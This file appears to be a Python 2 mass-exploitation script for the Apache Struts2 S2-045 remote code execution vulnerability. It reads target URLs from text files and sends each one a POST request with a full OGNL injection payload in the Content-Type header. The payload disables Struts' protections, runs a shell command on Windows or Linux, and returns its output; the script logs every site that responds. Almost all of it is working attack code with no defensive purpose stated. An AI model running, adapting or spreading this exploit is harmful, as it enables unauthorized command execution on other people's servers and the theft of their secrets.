# -*- coding:utf-8 -*-
import os
import base64
import requests
import argparse
code_path = os.getcwd()
code_logo = """
███████╗████████╗██████╗ ██╗   ██╗████████╗███████╗      ██████╗ 
██╔════╝╚══██╔══╝██╔══██╗██║   ██║╚══██╔══╝██╔════╝      ╚════██╗
███████╗   ██║   ██████╔╝██║   ██║   ██║   ███████╗█████╗ █████╔╝
╚════██║   ██║   ██╔══██╗██║   ██║   ██║   ╚════██║╚════╝██╔═══╝ 
███████║   ██║   ██║  ██║╚██████╔╝   ██║   ███████║      ███████╗
╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝      ╚══════╝
"""
def check_045(scan_url):
    headers = {}
    headers['User-Agent'] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) " \
                            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    cmd = 'env'
    headers['Content-Type'] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." \
                                "(#_memberAccess?(#_memberAccess=#dm):" \
                                "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." \
                                "(#ognlUtil=#container.getInstance" \
                                "(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." \
                                "(#ognlUtil.getExcludedPackageNames().clear())." \
                                "(#ognlUtil.getExcludedClasses().clear())." \
                                "(#context.setMemberAccess(#dm))))." \
                                "(#cmd='" + \
                                cmd + \
                                "')." \
                                "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase()." \
                                "contains('win')))." \
                                "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))." \
                                "(#p=new java.lang.ProcessBuilder(#cmds))." \
                                "(#p.redirectErrorStream(true)).(#process=#p.start())." \
                                "(#ros=(@org.apache.struts2.ServletActionContext@getResponse()." \
                                "getOutputStream()))." \
                                "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." \
                                "(#ros.flush())}"
    data = '--40a1f31a0ec74efaa46d53e9f4311353\r\n' \
            'Content-Disposition: form-data; name="image1"\r\n' \
            'Content-Type: text/plain; charset=utf-8\r\n\r\ntest\r\n--40a1f31a0ec74efaa46d53e9f4311353--\r\n'
    try:
        res=requests.post(scan_url,data,verify=False,headers=headers,timeout=(4,20))
        result=res.text.strip()
        if res.status_code==200 and len(result)<100:
            print('User:'+result+'   The 045 is True!')
            with open('success_045.txt','a') as f:
                f.write(scan_url+'\n')
        else:
            print('The 045 isn\'t exist')
    except Exception,e:
        print('The content  isn\'t exist')


def check_struts(open_file):
    print code_logo+"\n"
    for scan_url in open_file:
        print "----------------Struts-2  Scanning----------------"+"\n"+"target  "+scan_url
        check_045(scan_url)

def scan_all():
    scan_list_path = code_path+"/scan-list/"
    for root,dirs,filename in os.walk(scan_list_path):
        for i in range(len(filename)):
            if filename[i][-3:] == 'txt':
                file_path = root+"/"+filename[i]
                try:
                    print "Try open "+filename[i]
                    print "-------------------------------"
                    open_file = open(file_path).readlines()
                    check_struts(open_file)
                except Exception,e:
                    print e
                    print "Open File Error"


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Use this script")
    parser.add_argument("--s",type=str,metavar='Scan',default=None,help="--s http://xxxx or --s all  please put the file in the scan-list folder")
    parser.add_argument("--u",type=str,metavar='Use',default=None,help="--u http://xxxx or --u xxx.ini   If you know the vulnerability url,use url or file directly")
    parser.add_argument("--a",type=str,metavar='auto',default=None,help="--a baidu  or  google   choose the search engine you need to take advantage of")
    args = parser.parse_args()
    if args.s == "all":
        scan_all()
    else:
        print "error"

